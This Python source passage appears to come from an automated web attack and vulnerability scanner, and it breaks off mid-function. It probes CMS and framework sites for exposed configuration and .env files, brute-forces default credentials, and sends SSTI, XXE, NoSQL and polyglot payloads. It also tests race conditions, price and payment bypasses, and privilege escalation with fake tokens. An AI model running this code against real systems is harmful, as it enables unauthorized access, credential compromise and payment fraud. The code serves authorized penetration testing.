                wp_results['xmlrpc_enabled'] = {
                    'vulnerable': True,
                    'vulnerability': 'WordPress XML-RPC enabled - potential for brute force attacks'
                }
        except Exception as e:
            wp_results['xmlrpc_enabled'] = {'error': str(e)}
        
        # Test debug log
        debug_paths = ['/wp-content/debug.log', '/debug.log', '/wp-content/uploads/debug.log']
        for debug_path in debug_paths:
            try:
                debug_url = urljoin(url, debug_path)
                response = self.session.get(debug_url)
                
                if response.status_code == 200 and ('php' in response.text.lower() or 'error' in response.text.lower()):
                    wp_results['debug_log'][debug_path] = {
                        'vulnerable': True,
                        'vulnerability': 'WordPress debug log accessible'
                    }
            except Exception as e:
                wp_results['debug_log'][debug_path] = {'error': str(e)}
        
        return wp_results

    async def _test_drupal_vulnerabilities(self, url: str) -> Dict[str, Any]:
        """Test for Drupal-specific vulnerabilities"""
        drupal_results = {
            'changelog_accessible': {},
            'user_enumeration': {},
            'install_file': {}
        }
        
        # Test changelog access
        try:
            changelog_url = urljoin(url, '/CHANGELOG.txt')
            response = self.session.get(changelog_url)
            
            if response.status_code == 200 and 'drupal' in response.text.lower():
                drupal_results['changelog_accessible'] = {
                    'vulnerable': True,
                    'vulnerability': 'Drupal changelog accessible - version disclosure'
                }
        except Exception as e:
            drupal_results['changelog_accessible'] = {'error': str(e)}
        
        # Test user enumeration
        try:
            user_url = urljoin(url, '/user/1')
            response = self.session.get(user_url)
            
            if response.status_code == 200:
                drupal_results['user_enumeration'] = {
                    'vulnerable': True,
                    'vulnerability': 'Drupal user enumeration possible'
                }
        except Exception as e:
            drupal_results['user_enumeration'] = {'error': str(e)}
        
        return drupal_results

    async def _test_joomla_vulnerabilities(self, url: str) -> Dict[str, Any]:
        """Test for Joomla-specific vulnerabilities"""
        joomla_results = {
            'configuration_disclosure': {},
            'admin_finder': {}
        }
        
        # Test configuration file access
        config_paths = ['/configuration.php', '/configuration.php.bak', '/configuration.php~']
        for config_path in config_paths:
            try:
                config_url = urljoin(url, config_path)
                response = self.session.get(config_url)
                
                if response.status_code == 200 and ('jconfig' in response.text.lower() or 'password' in response.text.lower()):
                    joomla_results['configuration_disclosure'][config_path] = {
                        'vulnerable': True,
                        'vulnerability': 'Joomla configuration file accessible'
                    }
            except Exception as e:
                joomla_results['configuration_disclosure'][config_path] = {'error': str(e)}
        
        return joomla_results

    async def _test_framework_vulnerabilities(self, url: str, framework: str) -> Dict[str, Any]:
        """Test for framework-specific vulnerabilities"""
        framework_results = {}
        
        if 'laravel' in framework.lower():
            framework_results = await self._test_laravel_vulnerabilities(url)
        elif 'django' in framework.lower():
            framework_results = await self._test_django_vulnerabilities(url)
        elif 'rails' in framework.lower():
            framework_results = await self._test_rails_vulnerabilities(url)
        
        return framework_results

    async def _test_laravel_vulnerabilities(self, url: str) -> Dict[str, Any]:
        """Test for Laravel-specific vulnerabilities"""
        laravel_results = {
            'debug_mode': {},
            'env_file': {},
            'telescope': {}
        }
        
        # Test debug mode
        try:
            # Trigger an error to check for debug mode
            debug_url = urljoin(url, '/non-existent-route-12345')
            response = self.session.get(debug_url)
            
            if 'laravel' in response.text.lower() and 'stack trace' in response.text.lower():
                laravel_results['debug_mode'] = {
                    'vulnerable': True,
                    'vulnerability': 'Laravel debug mode enabled - information disclosure'
                }
        except Exception as e:
            laravel_results['debug_mode'] = {'error': str(e)}
        
        # Test .env file access
        try:
            env_url = urljoin(url, '/.env')
            response = self.session.get(env_url)
            
            if response.status_code == 200 and ('app_key' in response.text.lower() or 'db_password' in response.text.lower()):
                laravel_results['env_file'] = {
                    'vulnerable': True,
                    'vulnerability': 'Laravel .env file accessible - critical information disclosure'
                }
        except Exception as e:
            laravel_results['env_file'] = {'error': str(e)}
        
        # Test Laravel Telescope
        try:
            telescope_url = urljoin(url, '/telescope')
            response = self.session.get(telescope_url)
            
            if response.status_code == 200 and 'telescope' in response.text.lower():
                laravel_results['telescope'] = {
                    'vulnerable': True,
                    'vulnerability': 'Laravel Telescope accessible - debugging interface exposed'
                }
        except Exception as e:
            laravel_results['telescope'] = {'error': str(e)}
        
        return laravel_results

    async def _test_django_vulnerabilities(self, url: str) -> Dict[str, Any]:
        """Test for Django-specific vulnerabilities"""
        django_results = {
            'debug_mode': {},
            'admin_panel': {}
        }
        
        # Test debug mode
        try:
            debug_url = urljoin(url, '/non-existent-path-12345')
            response = self.session.get(debug_url)
            
            if 'django' in response.text.lower() and 'traceback' in response.text.lower():
                django_results['debug_mode'] = {
                    'vulnerable': True,
                    'vulnerability': 'Django debug mode enabled - information disclosure'
                }
        except Exception as e:
            django_results['debug_mode'] = {'error': str(e)}
        
        # Test admin panel
        try:
            admin_url = urljoin(url, '/admin/')
            response = self.session.get(admin_url)
            
            if response.status_code == 200 and 'django administration' in response.text.lower():
                django_results['admin_panel'] = {
                    'accessible': True,
                    'note': 'Django admin panel accessible - test for default credentials'
                }
        except Exception as e:
            django_results['admin_panel'] = {'error': str(e)}
        
        return django_results

    async def _test_rails_vulnerabilities(self, url: str) -> Dict[str, Any]:
        """Test for Ruby on Rails-specific vulnerabilities"""
        rails_results = {
            'routes_disclosure': {},
            'development_mode': {}
        }
        
        # Test routes disclosure
        try:
            routes_url = urljoin(url, '/rails/info/routes')
            response = self.session.get(routes_url)
            
            if response.status_code == 200 and 'routes' in response.text.lower():
                rails_results['routes_disclosure'] = {
                    'vulnerable': True,
                    'vulnerability': 'Rails routes information accessible'
                }
        except Exception as e:
            rails_results['routes_disclosure'] = {'error': str(e)}
        
        return rails_results

    async def _test_js_library_vulnerabilities(self, url: str, lib_name: str, lib_version: str) -> Dict[str, Any]:
        """Test for JavaScript library vulnerabilities"""
        js_results = {
            'version_check': {
                'library': lib_name,
                'version': lib_version,
                'known_vulnerabilities': []
            }
        }
        
        # Known vulnerable versions (simplified - in production use CVE databases)
        vulnerable_versions = {
            'jquery': {
                '1.6.0': ['XSS in jQuery.globalEval()'],
                '1.7.0': ['XSS in jQuery.globalEval()'],
                '2.1.4': ['XSS vulnerability'],
                '3.0.0': ['XSS vulnerability']
            },
            'angular': {
                '1.5.0': ['Sandbox bypass'],
                '1.6.0': ['Expression injection']
            },
            'react': {
                '16.0.0': ['XSS in href attribute']
            }
        }
        
        lib_lower = lib_name.lower()
        if lib_lower in vulnerable_versions:
            for vuln_version, vulns in vulnerable_versions[lib_lower].items():
                if lib_version.startswith(vuln_version):
                    js_results['version_check']['known_vulnerabilities'].extend(vulns)
        
        return js_results

    async def _exploit_forgotten_subdomains(self, subdomains: List[Dict[str, Any]]) -> Dict[str, Any]:
        """Exploit forgotten or test subdomains"""
        logger.info(f"Exploiting {len(subdomains)} discovered subdomains")
        
        subdomain_results = {
            'test_environments': {},
            'default_credentials': {},
            'debug_panels': {},
            'internal_apis': {}
        }
        
        # Focus on test/staging/dev subdomains
        test_keywords = ['test', 'staging', 'dev', 'demo', 'beta', 'alpha', 'internal', 'admin']
        
        for subdomain_info in subdomains:
            if isinstance(subdomain_info, dict):
                host = subdomain_info.get('host', '')
            else:
                host = str(subdomain_info)
            
            # Check if it's a test environment
            if any(keyword in host.lower() for keyword in test_keywords):
                logger.info(f"Testing forgotten subdomain: {host}")
                
                try:
                    # Test default credentials
                    cred_results = await self._test_default_credentials(host)
                    subdomain_results['default_credentials'][host] = cred_results
                    
                    # Test for debug panels
                    debug_results = await self._test_debug_panels(host)
                    subdomain_results['debug_panels'][host] = debug_results
                    
                    # Test for internal APIs
                    api_results = await self._test_internal_apis(host)
                    subdomain_results['internal_apis'][host] = api_results
                    
                    # Mark as test environment
                    subdomain_results['test_environments'][host] = {
                        'identified_as_test': True,
                        'keywords_matched': [kw for kw in test_keywords if kw in host.lower()]
                    }
                    
                except Exception as e:
                    logger.error(f"Subdomain exploitation error for {host}: {e}")
                    subdomain_results['test_environments'][host] = {'error': str(e)}
        
        return subdomain_results

    async def _test_default_credentials(self, host: str) -> Dict[str, Any]:
        """Test for default credentials on various services"""
        cred_results = {
            'login_panels_found': [],
            'successful_logins': [],
            'tests_performed': []
        }
        
        # Common login paths
        login_paths = [
            '/login', '/admin', '/admin/login', '/administrator',
            '/wp-admin', '/wp-login.php', '/phpmyadmin',
            '/manager/html', '/console', '/dashboard'
        ]
        
        # Common default credentials
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('admin', '123456'),
            ('administrator', 'administrator'),
            ('root', 'root'),
            ('test', 'test'),
            ('demo', 'demo'),
            ('guest', 'guest'),
            ('user', 'user')
        ]
        
        for scheme in ['https', 'http']:
            base_url = f"{scheme}://{host}"
            
            for login_path in login_paths:
                try:
                    login_url = urljoin(base_url, login_path)
                    response = self.session.get(login_url, timeout=10)
                    
                    if response.status_code == 200:
                        # Check if it's a login form
                        if any(keyword in response.text.lower() for keyword in ['password', 'login', 'username', 'signin']):
                            cred_results['login_panels_found'].append(login_url)
                            
                            # Test default credentials
                            for username, password in default_creds:
                                login_result = await self._attempt_login(login_url, username, password)
                                
                                test_record = {
                                    'url': login_url,
                                    'username': username,
                                    'password': password,
                                    'success': login_result.get('success', False)
                                }
                                
                                cred_results['tests_performed'].append(test_record)
                                
                                if login_result.get('success'):
                                    cred_results['successful_logins'].append(test_record)
                                    logger.warning(f"Default credentials found: {username}:{password} on {login_url}")
                
                except Exception as e:
                    logger.debug(f"Default credential test error for {login_url}: {e}")
        
        return cred_results

    async def _attempt_login(self, login_url: str, username: str, password: str) -> Dict[str, Any]:
        """Attempt to login with given credentials"""
        try:
            # First, get the login page to extract form details
            response = self.session.get(login_url)
            
            if response.status_code != 200:
                return {'success': False, 'error': 'Login page not accessible'}
            
            # Try different login methods
            login_data = {
                'username': username,
                'password': password,
                'user': username,
                'pass': password,
                'login': username,
                'email': username
            }
            
            # POST to the same URL
            post_response = self.session.post(login_url, data=login_data, allow_redirects=False)
            
            # Check for successful login indicators
            success_indicators = [
                post_response.status_code in [302, 301],  # Redirect after login
                'dashboard' in post_response.text.lower(),
                'welcome' in post_response.text.lower(),
                'logout' in post_response.text.lower(),
                'profile' in post_response.text.lower()
            ]
            
            # Check for failure indicators
            failure_indicators = [
                'invalid' in post_response.text.lower(),
                'incorrect' in post_response.text.lower(),
                'failed' in post_response.text.lower(),
                'error' in post_response.text.lower()
            ]
            
            if any(success_indicators) and not any(failure_indicators):
                return {
                    'success': True,
                    'status_code': post_response.status_code,
                    'response_length': len(post_response.text)
                }
            else:
                return {
                    'success': False,
                    'status_code': post_response.status_code
                }
                
        except Exception as e:
            return {'success': False, 'error': str(e)}

    async def _test_debug_panels(self, host: str) -> Dict[str, Any]:
        """Test for exposed debug panels"""
        debug_results = {
            'panels_found': [],
            'accessible_panels': []
        }
        
        # Common debug panel paths
        debug_paths = [
            '/debug', '/debug/', '/debug.php',
            '/phpinfo.php', '/info.php', '/test.php',
            '/status', '/health', '/metrics',
            '/actuator', '/actuator/health', '/actuator/env',
            '/console', '/shell', '/terminal',
            '/.env', '/config', '/config.php',
            '/server-status', '/server-info'
        ]
        
        for scheme in ['https', 'http']:
            base_url = f"{scheme}://{host}"
            
            for debug_path in debug_paths:
                try:
                    debug_url = urljoin(base_url, debug_path)
                    response = self.session.get(debug_url, timeout=10)
                    
                    if response.status_code == 200:
                        debug_results['panels_found'].append(debug_url)
                        
                        # Check for sensitive information
                        sensitive_content = [
                            'phpinfo', 'configuration', 'environment',
                            'database', 'password', 'secret', 'key',
                            'debug', 'trace', 'stack', 'error'
                        ]
                        
                        if any(content in response.text.lower() for content in sensitive_content):
                            debug_results['accessible_panels'].append({
                                'url': debug_url,
                                'vulnerability': 'Debug panel with sensitive information exposed'
                            })
                
                except Exception as e:
                    logger.debug(f"Debug panel test error for {debug_url}: {e}")
        
        return debug_results

    async def _test_internal_apis(self, host: str) -> Dict[str, Any]:
        """Test for internal APIs without authentication"""
        api_results = {
            'internal_apis_found': [],
            'unauthenticated_access': []
        }
        
        # Common internal API paths
        internal_api_paths = [
            '/api/internal', '/api/admin', '/api/debug',
            '/internal', '/internal/api', '/admin/api',
            '/v1/internal', '/v2/internal',
            '/api/users', '/api/config', '/api/status',
            '/graphql', '/graphiql'
        ]
        
        for scheme in ['https', 'http']:
            base_url = f"{scheme}://{host}"
            
            for api_path in internal_api_paths:
                try:
                    api_url = urljoin(base_url, api_path)
                    response = self.session.get(api_url, timeout=10)
                    
                    if response.status_code == 200:
                        api_results['internal_apis_found'].append(api_url)
                        
                        # Check if it returns sensitive data
                        try:
                            if response.headers.get('content-type', '').startswith('application/json'):
                                json_data = response.json()
                                if isinstance(json_data, (dict, list)) and json_data:
                                    api_results['unauthenticated_access'].append({
                                        'url': api_url,
                                        'vulnerability': 'Internal API accessible without authentication',
                                        'data_preview': str(json_data)[:200]
                                    })
                        except json.JSONDecodeError:
                            # Check for other sensitive content
                            if any(keyword in response.text.lower() for keyword in ['user', 'admin', 'config', 'password']):
                                api_results['unauthenticated_access'].append({
                                    'url': api_url,
                                    'vulnerability': 'Internal API with sensitive content accessible'
                                })
                
                except Exception as e:
                    logger.debug(f"Internal API test error for {api_url}: {e}")
        
        return api_results

    async def _advanced_fuzzing_techniques(self) -> Dict[str, Any]:
        """Implement advanced fuzzing techniques"""
        logger.info("Starting advanced fuzzing techniques")
        
        fuzzing_results = {
            'polyglot_injection': {},
            'ssti_testing': {},
            'xxe_testing': {},
            'nosql_injection': {},
            'race_condition_testing': {}
        }
        
        # Get web services from reconnaissance data
        web_services = self._extract_web_services()
        
        for service_url in web_services[:5]:  # Limit to first 5 services
            logger.info(f"Advanced fuzzing on: {service_url}")
            
            try:
                # Polyglot payload testing
                fuzzing_results['polyglot_injection'][service_url] = await self._test_polyglot_payloads(service_url)
                
                # SSTI testing
                fuzzing_results['ssti_testing'][service_url] = await self._test_ssti_vulnerabilities(service_url)
                
                # XXE testing
                fuzzing_results['xxe_testing'][service_url] = await self._test_xxe_vulnerabilities(service_url)
                
                # NoSQL injection testing
                fuzzing_results['nosql_injection'][service_url] = await self._test_nosql_injection(service_url)
                
                # Race condition testing
                fuzzing_results['race_condition_testing'][service_url] = await self._test_race_conditions(service_url)
                
            except Exception as e:
                logger.error(f"Advanced fuzzing error for {service_url}: {e}")
                fuzzing_results['polyglot_injection'][service_url] = {'error': str(e)}
        
        return fuzzing_results

    def _extract_web_services(self) -> List[str]:
        """Extract web services from reconnaissance data"""
        web_services = []
        
        # From live hosts
        live_hosts = self.recon_data.get('asset_validation', {}).get('live_hosts', [])
        for host_info in live_hosts:
            if isinstance(host_info, dict) and 'url' in host_info:
                web_services.append(host_info['url'])
            elif isinstance(host_info, dict) and 'host' in host_info:
                web_services.append(f"https://{host_info['host']}")
        
        # From API discovery
        apis = self.recon_data.get('api_discovery', {}).get('discovered_apis', [])
        for api_info in apis:
            if isinstance(api_info, dict) and 'url' in api_info:
                web_services.append(api_info['url'])
        
        # Add main target if not present
        if not web_services:
            web_services.append(f"https://{self.target}")
        
        return list(set(web_services))  # Remove duplicates

    async def _test_polyglot_payloads(self, service_url: str) -> Dict[str, Any]:
        """Test polyglot payloads that can trigger multiple vulnerabilities"""
        polyglot_results = {
            'payloads_tested': [],
            'vulnerabilities_found': []
        }
        
        for payload_info in self.polyglot_payloads:
            payload = payload_info['payload']
            expected_vulns = payload_info['targets']
            
            # Test in different contexts
            test_contexts = [
                {'method': 'GET', 'param': 'q'},
                {'method': 'GET', 'param': 'search'},
                {'method': 'POST', 'data': {'input': payload}},
                {'method': 'POST', 'data': {'comment': payload}},
                {'headers': {'X-Custom-Header': payload}}
            ]
            
            for context in test_contexts:
                try:
                    if context.get('method') == 'GET':
                        param_name = context['param']
                        test_url = f"{service_url}?{param_name}={payload}"
                        response = self.session.get(test_url)
                    elif context.get('method') == 'POST':
                        response = self.session.post(service_url, data=context['data'])
                    elif 'headers' in context:
                        response = self.session.get(service_url, headers=context['headers'])
                    
                    test_result = {
                        'payload': payload,
                        'context': context,
                        'status_code': response.status_code,
                        'response_length': len(response.text),
                        'vulnerabilities_detected': []
                    }
                    
                    # Check for vulnerability indicators
                    response_text = response.text.lower()
                    
                    # XSS detection
                    if payload.lower() in response_text and '<script>' in payload.lower():
                        test_result['vulnerabilities_detected'].append('XSS')
                    
                    # SQLi detection
                    sql_errors = ['sql syntax', 'mysql_fetch', 'ora-', 'postgresql', 'sqlite_']
                    if any(error in response_text for error in sql_errors):
                        test_result['vulnerabilities_detected'].append('SQLi')
                    
                    # SSTI detection
                    if '49' in response.text and '{{7*7}}' in payload:  # 7*7=49
                        test_result['vulnerabilities_detected'].append('SSTI')
                    
                    # Command injection detection
                    if 'root:' in response.text and 'etc/passwd' in payload:
                        test_result['vulnerabilities_detected'].append('Command Injection')
                    
                    polyglot_results['payloads_tested'].append(test_result)
                    
                    if test_result['vulnerabilities_detected']:
                        polyglot_results['vulnerabilities_found'].append(test_result)
                
                except Exception as e:
                    logger.debug(f"Polyglot payload test error: {e}")
        
        return polyglot_results

    async def _test_ssti_vulnerabilities(self, service_url: str) -> Dict[str, Any]:
        """Test for Server-Side Template Injection vulnerabilities"""
        ssti_results = {
            'template_engines_tested': [],
            'vulnerabilities_found': []
        }
        
        for engine_info in self.ssti_payloads:
            engine_name = engine_info['engine']
            payloads = engine_info['payloads']
            
            for payload_info in payloads:
                payload = payload_info['payload']
                expected_output = payload_info['expected']
                
                # Test in different parameters
                test_params = ['name', 'template', 'content', 'message', 'data']
                
                for param in test_params:
                    try:
                        # Test GET parameter
                        test_url = f"{service_url}?{param}={payload}"
                        response = self.session.get(test_url)
                        
                        test_result = {
                            'engine': engine_name,
                            'payload': payload,
                            'parameter': param,
                            'method': 'GET',
                            'status_code': response.status_code,
                            'vulnerable': False
                        }
                        
                        # Check if expected output is in response
                        if expected_output in response.text:
                            test_result['vulnerable'] = True
                            test_result['vulnerability'] = f'SSTI in {engine_name} template engine'
                            ssti_results['vulnerabilities_found'].append(test_result)
                        
                        ssti_results['template_engines_tested'].append(test_result)
                        
                        # Also test POST
                        post_response = self.session.post(service_url, data={param: payload})
                        
                        post_test_result = {
                            'engine': engine_name,
                            'payload': payload,
                            'parameter': param,
                            'method': 'POST',
                            'status_code': post_response.status_code,
                            'vulnerable': False
                        }
                        
                        if expected_output in post_response.text:
                            post_test_result['vulnerable'] = True
                            post_test_result['vulnerability'] = f'SSTI in {engine_name} template engine'
                            ssti_results['vulnerabilities_found'].append(post_test_result)
                        
                        ssti_results['template_engines_tested'].append(post_test_result)
                        
                    except Exception as e:
                        logger.debug(f"SSTI test error: {e}")
        
        return ssti_results

    async def _test_xxe_vulnerabilities(self, service_url: str) -> Dict[str, Any]:
        """Test for XXE (XML External Entity) vulnerabilities"""
        xxe_results = {
            'xxe_tests': [],
            'vulnerabilities_found': []
        }
        
        for xxe_payload in self.xxe_payloads:
            payload_xml = xxe_payload['payload']
            attack_type = xxe_payload['type']
            
            try:
                # Test XML upload/processing endpoints
                headers = {'Content-Type': 'application/xml'}
                response = self.session.post(service_url, data=payload_xml, headers=headers)
                
                test_result = {
                    'attack_type': attack_type,
                    'payload': payload_xml[:200],  # Truncate for readability
                    'status_code': response.status_code,
                    'response_length': len(response.text),
                    'vulnerable': False
                }
                
                # Check for XXE indicators
                if attack_type == 'file_disclosure':
                    if 'root:' in response.text or '/etc/passwd' in response.text:
                        test_result['vulnerable'] = True
                        test_result['vulnerability'] = 'XXE file disclosure vulnerability'
                elif attack_type == 'ssrf':
                    if 'localhost' in response.text or '127.0.0.1' in response.text:
                        test_result['vulnerable'] = True
                        test_result['vulnerability'] = 'XXE SSRF vulnerability'
                elif attack_type == 'dos':
                    if response.elapsed.total_seconds() > 10:
                        test_result['vulnerable'] = True
                        test_result['vulnerability'] = 'XXE DoS vulnerability'
                
                xxe_results['xxe_tests'].append(test_result)
                
                if test_result['vulnerable']:
                    xxe_results['vulnerabilities_found'].append(test_result)
                
            except Exception as e:
                logger.debug(f"XXE test error: {e}")
        
        return xxe_results

    async def _test_nosql_injection(self, service_url: str) -> Dict[str, Any]:
        """Test for NoSQL injection vulnerabilities"""
        nosql_results = {
            'injection_tests': [],
            'vulnerabilities_found': []
        }
        
        for nosql_payload in self.nosql_payloads:
            payload = nosql_payload['payload']
            db_type = nosql_payload['database']
            injection_type = nosql_payload['type']
            
            # Test in different parameters
            test_params = ['id', 'user', 'username', 'email', 'search']
            
            for param in test_params:
                try:
                    # Test GET parameter
                    test_url = f"{service_url}?{param}={payload}"
                    response = self.session.get(test_url)
                    
                    test_result = {
                        'database': db_type,
                        'injection_type': injection_type,
                        'payload': payload,
                        'parameter': param,
                        'status_code': response.status_code,
                        'vulnerable': False
                    }
                    
                    # Check for NoSQL injection indicators
                    if injection_type == 'authentication_bypass':
                        if response.status_code == 200 and len(response.text) > 1000:
                            test_result['vulnerable'] = True
                            test_result['vulnerability'] = 'NoSQL authentication bypass'
                    elif injection_type == 'data_extraction':
                        if 'user' in response.text.lower() or 'admin' in response.text.lower():
                            test_result['vulnerable'] = True
                            test_result['vulnerability'] = 'NoSQL data extraction'
                    
                    nosql_results['injection_tests'].append(test_result)
                    
                    if test_result['vulnerable']:
                        nosql_results['vulnerabilities_found'].append(test_result)
                
                except Exception as e:
                    logger.debug(f"NoSQL injection test error: {e}")
        
        return nosql_results

    async def _test_race_conditions(self, service_url: str) -> Dict[str, Any]:
        """Test for race condition vulnerabilities"""
        race_results = {
            'race_tests': [],
            'vulnerabilities_found': []
        }
        
        # Common endpoints that might be vulnerable to race conditions
        race_endpoints = [
            '/api/coupon/apply', '/api/discount/apply',
            '/api/transfer', '/api/payment',
            '/api/vote', '/api/like',
            '/api/purchase', '/api/order'
        ]
        
        for endpoint in race_endpoints:
            test_url = urljoin(service_url, endpoint)
            
            try:
                # Prepare multiple identical requests
                num_requests = 10
                request_data = {
                    'amount': 1,
                    'coupon': 'DISCOUNT50',
                    'item_id': 1
                }
                
                # Send requests simultaneously
                tasks = []
                for i in range(num_requests):
                    task = asyncio.create_task(self._send_race_request(test_url, request_data))
                    tasks.append(task)
                
                # Wait for all requests to complete
                responses = await asyncio.gather(*tasks, return_exceptions=True)
                
                # Analyze responses for race condition indicators
                successful_responses = [r for r in responses if not isinstance(r, Exception) and r.get('status_code') == 200]
                
                test_result = {
                    'endpoint': test_url,
                    'total_requests': num_requests,
                    'successful_requests': len(successful_responses),
                    'vulnerable': False
                }
                
                # If too many requests succeeded, it might indicate a race condition
                if len(successful_responses) > 1:
                    test_result['vulnerable'] = True
                    test_result['vulnerability'] = 'Potential race condition vulnerability'
                    race_results['vulnerabilities_found'].append(test_result)
                
                race_results['race_tests'].append(test_result)
                
            except Exception as e:
                logger.debug(f"Race condition test error for {test_url}: {e}")
        
        return race_results

    async def _send_race_request(self, url: str, data: Dict[str, Any]) -> Dict[str, Any]:
        """Send a single request for race condition testing"""
        try:
            response = self.session.post(url, json=data, timeout=5)
            return {
                'status_code': response.status_code,
                'response_time': response.elapsed.total_seconds(),
                'response_length': len(response.text)
            }
        except Exception as e:
            return {'error': str(e)}

    async def _business_logic_testing(self) -> Dict[str, Any]:
        """Test for business logic vulnerabilities"""
        logger.info("Starting business logic vulnerability testing")
        
        business_logic_results = {
            'price_manipulation': {},
            'process_bypass': {},
            'access_control_testing': {},
            'functionality_abuse': {}
        }
        
        # Get web services
        web_services = self._extract_web_services()
        
        for service_url in web_services[:3]:  # Limit to first 3 services
            logger.info(f"Business logic testing on: {service_url}")
            
            try:
                # Price/quantity manipulation testing
                business_logic_results['price_manipulation'][service_url] = await self._test_price_manipulation(service_url)
                
                # Multi-step process bypass testing
                business_logic_results['process_bypass'][service_url] = await self._test_process_bypass(service_url)
                
                # Access control testing
                business_logic_results['access_control_testing'][service_url] = await self._test_granular_access_control(service_url)
                
                # Functionality abuse testing
                business_logic_results['functionality_abuse'][service_url] = await self._test_functionality_abuse(service_url)
                
            except Exception as e:
                logger.error(f"Business logic testing error for {service_url}: {e}")
                business_logic_results['price_manipulation'][service_url] = {'error': str(e)}
        
        return business_logic_results

    async def _test_price_manipulation(self, service_url: str) -> Dict[str, Any]:
        """Test for price/quantity manipulation vulnerabilities"""
        price_results = {
            'cart_manipulation': [],
            'checkout_manipulation': [],
            'vulnerabilities_found': []
        }
        
        # Common e-commerce endpoints
        ecommerce_endpoints = [
            '/api/cart/add', '/api/cart/update',
            '/api/checkout', '/api/order',
            '/cart/add', '/cart/update'
        ]
        
        for endpoint in ecommerce_endpoints:
            test_url = urljoin(service_url, endpoint)
            
            # Test price manipulation scenarios
            manipulation_tests = [
                {'price': -10, 'description': 'Negative price'},
                {'price': 0, 'description': 'Zero price'},
                {'price': 0.01, 'description': 'Very low price'},
                {'quantity': -1, 'description': 'Negative quantity'},
                {'quantity': 999999, 'description': 'Very high quantity'},
                {'total': 0, 'description': 'Zero total'},
                {'discount': 100, 'description': '100% discount'}
            ]
            
            for test_case in manipulation_tests:
                try:
                    # Test with POST request
                    test_data = {
                        'item_id': 1,
                        'product_id': 1,
                        **test_case
                    }
                    
                    response = self.session.post(test_url, json=test_data)
                    
                    test_result = {
                        'endpoint': test_url,
                        'test_case': test_case['description'],
                        'payload': test_data,
                        'status_code': response.status_code,
                        'vulnerable': False
                    }
                    
                    # Check if manipulation was accepted
                    if response.status_code in [200, 201, 202]:
                        # Look for signs that the manipulation was processed
                        response_text = response.text.lower()
                        if any(keyword in response_text for keyword in ['success', 'added', 'updated', 'confirmed']):
                            test_result['vulnerable'] = True
                            test_result['vulnerability'] = f'Price manipulation accepted: {test_case["description"]}'
                            price_results['vulnerabilities_found'].append(test_result)
                    
                    if 'cart' in endpoint:
                        price_results['cart_manipulation'].append(test_result)
                    else:
                        price_results['checkout_manipulation'].append(test_result)
                
                except Exception as e:
                    logger.debug(f"Price manipulation test error: {e}")
        
        return price_results

    async def _test_process_bypass(self, service_url: str) -> Dict[str, Any]:
        """Test for multi-step process bypass vulnerabilities"""
        bypass_results = {
            'registration_bypass': [],
            'payment_bypass': [],
            'verification_bypass': [],
            'vulnerabilities_found': []
        }
        
        # Test registration process bypass
        registration_steps = [
            '/api/register/step1',
            '/api/register/step2',
            '/api/register/complete',
            '/api/user/create'
        ]
        
        for step_url in registration_steps:
            test_url = urljoin(service_url, step_url)
            
            try:
                # Try to skip to final step
                final_step_data = {
                    'username': 'testuser',
                    'email': 'test@example.com',
                    'password': 'password123',
                    'verified': True,
                    'completed': True
                }
                
                response = self.session.post(test_url, json=final_step_data)
                
                test_result = {
                    'endpoint': test_url,
                    'test_type': 'Registration bypass',
                    'status_code': response.status_code,
                    'vulnerable': False
                }
                
                if response.status_code in [200, 201]:
                    test_result['vulnerable'] = True
                    test_result['vulnerability'] = 'Registration process bypass possible'
                    bypass_results['vulnerabilities_found'].append(test_result)
                
                bypass_results['registration_bypass'].append(test_result)
                
            except Exception as e:
                logger.debug(f"Registration bypass test error: {e}")
        
        # Test payment process bypass
        payment_steps = [
            '/api/payment/initiate',
            '/api/payment/process',
            '/api/payment/complete',
            '/api/order/confirm'
        ]
        
        for step_url in payment_steps:
            test_url = urljoin(service_url, step_url)
            
            try:
                # Try to complete payment without proper flow
                payment_data = {
                    'order_id': 1,
                    'amount': 0,
                    'status': 'completed',
                    'paid': True
                }
                
                response = self.session.post(test_url, json=payment_data)
                
                test_result = {
                    'endpoint': test_url,
                    'test_type': 'Payment bypass',
                    'status_code': response.status_code,
                    'vulnerable': False
                }
                
                if response.status_code in [200, 201]:
                    test_result['vulnerable'] = True
                    test_result['vulnerability'] = 'Payment process bypass possible'
                    bypass_results['vulnerabilities_found'].append(test_result)
                
                bypass_results['payment_bypass'].append(test_result)
                
            except Exception as e:
                logger.debug(f"Payment bypass test error: {e}")
        
        return bypass_results

    async def _test_granular_access_control(self, service_url: str) -> Dict[str, Any]:
        """Test granular access control vulnerabilities"""
        access_results = {
            'horizontal_privilege_escalation': [],
            'vertical_privilege_escalation': [],
            'vulnerabilities_found': []
        }
        
        # Test horizontal privilege escalation (accessing other users' data)
        user_endpoints = [
            '/api/user/1/profile',
            '/api/user/2/orders',
            '/api/user/3/settings',
            '/api/users/1',
            '/api/profile/1'
        ]
        
        for endpoint in user_endpoints:
            test_url = urljoin(service_url, endpoint)
            
            try:
                # Test without authentication
                response = self.session.get(test_url)
                
                test_result = {
                    'endpoint': test_url,
                    'test_type': 'Horizontal privilege escalation',
                    'auth_method': 'None',
                    'status_code': response.status_code,
                    'vulnerable': False
                }
                
                if response.status_code == 200:
                    # Check if user data is returned
                    response_text = response.text.lower()
                    if any(keyword in response_text for keyword in ['user', 'profile', 'email', 'name']):
                        test_result['vulnerable'] = True
                        test_result['vulnerability'] = 'Horizontal privilege escalation - user data accessible'
                        access_results['vulnerabilities_found'].append(test_result)
                
                access_results['horizontal_privilege_escalation'].append(test_result)
                
                # Test with fake user token
                fake_headers = {
                    'Authorization': 'Bearer fake_token',
                    'X-User-ID': '999',
                    'X-Auth-User': 'different_user'
                }
                
                auth_response = self.session.get(test_url, headers=fake_headers)
                
                auth_test_result = {
                    'endpoint': test_url,
                    'test_type': 'Horizontal privilege escalation',
                    'auth_method': 'Fake token',
                    'status_code': auth_response.status_code,
                    'vulnerable': False
                }
                
                if auth_response.status_code == 200:
                    auth_test_result['vulnerable'] = True
                    auth_test_result['vulnerability'] = 'Horizontal privilege escalation with fake token'
                    access_results['vulnerabilities_found'].append(auth_test_result)
                
                access_results['horizontal_privilege_escalation'].append(auth_test_result)
                
            except Exception as e:
                logger.debug(f"Access control test error: {e}")
        
        # Test vertical privilege escalation (accessing admin functions)
        admin_endpoints = [
            '/api/admin/users',
            '/api/admin/config',
            '/api/admin/settings',
            '/admin/api/users',
            '/management/api/config'
        ]
        
        for endpoint in admin_endpoints:
            test_url = urljoin(service_url, endpoint)
            
            try:
                # Test with user-level token simulation
                user_headers = {
